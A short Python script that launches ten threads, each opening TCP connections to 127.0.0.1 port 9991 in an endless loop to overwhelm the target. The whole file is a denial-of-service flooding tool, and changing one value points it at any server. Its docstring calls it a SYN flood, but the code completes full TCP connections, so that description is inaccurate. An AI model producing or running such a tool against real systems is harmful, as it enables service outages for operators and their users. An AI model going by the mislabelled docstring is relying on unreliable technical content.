import socket
import threading

def syn_flood(target_ip, target_port):
    """
    Continuously attempts to open TCP connections to the specified target IP and port to simulate a SYN flood attack.

    Args:
        target_ip (str): The IP address of the target server.
        target_port (int): The port number of the target server.
    """
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
        except socket.error:
            pass
        sock.close()

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 9991
    for _ in range(10):  # Create 10 threads to simulate the attack
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        thread.start()